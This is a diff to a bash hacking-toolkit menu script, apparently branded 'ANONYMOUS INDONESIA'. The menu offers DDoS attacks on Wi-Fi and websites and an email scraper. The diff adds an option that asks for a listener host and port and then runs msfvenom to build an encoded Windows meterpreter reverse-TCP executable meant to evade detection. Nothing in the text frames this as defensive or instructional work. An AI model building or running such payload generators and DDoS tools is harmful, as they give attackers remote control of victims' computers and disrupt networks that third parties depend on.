@@ -28,7 +28,7 @@ echo "$e[e]─>>DDOS ATTACK WIFI" | lolcat
 echo "$f[f]─>>DDOS ATTACK WEBSITE" | lolcat
 echo "$g[g]─>>SCANNING WEBSITE ADDRESS" | lolcat
 echo "$h[h]─>>EMAIL SCRAPER WEBSITE" | lolcat
-echo "$i[i]─>>" | lolcat
+echo "$i[i]─>>CREATE PAYLOAD TO IMAGE" | lolcat
 echo "$j[j]─>>" | lolcat
 echo "$k[k]─>>" | lolcat
 echo "$l[l]─>>" | lolcat
@@ -243,9 +243,15 @@ sleep 2
 echo "##################################################################################"
 toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
 echo "**********************************************************************************"
-echo "[!]" | lolcat
+echo "[!]RUNNING TOOLS CREATE PAYLOAD TO IMAGE" | lolcat
 echo "##################################################################################"
 sleep 5
+ifconfig
+echo "╭─[Masukan LHOST]" | lolcat
+read -p"╰─>> " lhost
+echo "╭─[Masukan LPORT]" | lolcat
+read -p"╰─>> " lport
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a x64 --platform windows -e x64/zutto_dekiru -i 10 -n 500 -f exe -o venom.exe
 fi
 
 if [ $pil = j ]
